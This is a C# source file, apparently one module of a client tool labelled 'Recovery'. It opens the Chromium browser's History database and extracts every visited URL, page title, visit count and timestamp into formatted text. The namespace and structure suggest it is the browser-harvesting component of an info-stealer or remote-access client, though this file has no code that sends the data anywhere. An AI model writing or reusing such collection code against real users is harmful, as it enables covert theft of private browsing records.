namespace SeacoreClient.Features.Recovery.Browsers.Chromium
{
    public static class ChromiumHistory
    {
        public static void Recover(string browserName, string relativeSearchPath)
        {
            string dbName = "History";
            string query = ChromiumCommon.DbQueries["History"];

            ChromiumCommon.ExecuteSqliteQueryAndProcessResults(
                browserName,
                dbName,
                query,
                reader =>
                {
                    string url = reader["url"].ToString();
                    string title = reader["title"].ToString();
                    int visitCount = Convert.ToInt32(reader["visit_count"]);
                    long visitTimeMicroseconds = Convert.ToInt64(reader["visit_time"]);

                    DateTime epochStart = new(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                    long visitTimeTicks = visitTimeMicroseconds * 10;
                    DateTime visitTime = epochStart.AddTicks(visitTimeTicks).ToLocalTime();

                    return $"URL: {url}\nTitle: {title}\nVisit Count: {visitCount}\nVisit Time: {visitTime:yyyy-MM-dd HH:mm:ss}\n";
                },
                ChromiumCommon.FileNames["History"]);
        }
    }
}